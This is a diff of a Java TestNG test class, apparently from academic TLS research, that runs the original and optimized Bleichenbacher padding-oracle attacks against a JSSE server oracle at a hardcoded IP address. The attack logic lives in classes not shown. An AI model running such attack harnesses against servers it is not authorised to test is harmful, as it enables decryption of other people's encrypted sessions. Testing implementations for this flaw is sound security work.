@@ -27,12 +27,15 @@ import org.testng.annotations.BeforeClass;
 import org.testng.annotations.Test;
 
 /**
- * <DESCRIPTION> @author Christopher Meyer - christopher.meyer@rub.de
+ * Performs the Bleichenbacher Tests (original/optimized) against a vulnerable
+ * server.
+ *
+ * @author Christopher Meyer - christopher.meyer@rub.de
  * @version 0.1
  *
  * Feb 8, 2013
  */
-public class OptimizedBleichenbacherJSSETest {
+public class BleichenbacherJSSETest {
 
     /**
      * Plain PKCS message
@@ -93,6 +96,7 @@ public class OptimizedBleichenbacherJSSETest {
     private PrivateKey privateKey;
     private PublicKey publicKey;
     private Cipher cipher;
+    private byte[] encPMS;
     /**
      * Log4j logger initialization.
      */
@@ -130,20 +134,26 @@ public class OptimizedBleichenbacherJSSETest {
         return result;
     }
 
-    @Test(enabled = true)
+    @Test(enabled = true, priority = 1)
+    public void standardBleichenbacher() throws SocketException,
+            OracleException {
+        logger.info("++++Start Test (JSSE Real - original BB)++++");
+        JSSE16Oracle jsseOracle = new JSSE16Oracle("134.147.198.93", 51635);
+
+        Bleichenbacher attacker = new Bleichenbacher(encPMS,
+                jsseOracle, true);
+        attacker.attack();
+        logger.info("------------------------------");
+    }
+
+    @Test(enabled = true, priority = 2)
     public void optimizedBleichenbacher() throws SocketException,
             OracleException {
+        logger.info("++++Start Test (JSSE Real - optimized BB)++++");
         JSSE16Oracle jsseOracle = new JSSE16Oracle("134.147.198.93", 51635);
-//        StdPlainOracle plainOracle = new StdPlainOracle(publicKey,
-//                AOracle.OracleType.FFT, 256);
-        byte[] encPMS = encryptHelper(plainPKCS, publicKey);
-
-        logger.info("++++Start Test (JSSE Real)++++");
 
         BleichenbacherCrypto12 attacker = new BleichenbacherCrypto12(encPMS,
                 jsseOracle, true);
-//        Bleichenbacher attacker = new Bleichenbacher(encPMS,
-//                jsseOracle, true);
         attacker.attack();
         logger.info("------------------------------");
     }
@@ -160,15 +170,14 @@ public class OptimizedBleichenbacherJSSETest {
         Security.addProvider(new BouncyCastleProvider());
 
         try {
-            String keyName = "4096_rsa";
+            String keyName = "2048_rsa";
             String keyPassword = "password";
             KeyStore ks = loadKeyStore("server.jks", "password");
             publicKey = ks.getCertificate(keyName).getPublicKey();
             privateKey = (PrivateKey) ks.getKey(keyName, keyPassword.
                     toCharArray());
 
-            cipher = Cipher.getInstance("RSA/None/NoPadding");
-            cipher.init(Cipher.DECRYPT_MODE, privateKey);
+            encPMS = encryptHelper(plainPKCS, publicKey);
         } catch (UnrecoverableKeyException ex) {
             logger.error(ex.getMessage(), ex);
         } catch (KeyStoreException ex) {
@@ -177,11 +186,7 @@ public class OptimizedBleichenbacherJSSETest {
             logger.error(ex.getMessage(), ex);
         } catch (CertificateException ex) {
             logger.error(ex.getMessage(), ex);
-        } catch (InvalidKeyException ex) {
-            logger.error(ex.getMessage(), ex);
         } catch (NoSuchAlgorithmException ex) {
-            logger.error(ex.getMessage(), ex);
-        } catch (NoSuchPaddingException ex) {
             logger.error(ex.getMessage(), ex);
         }
     }
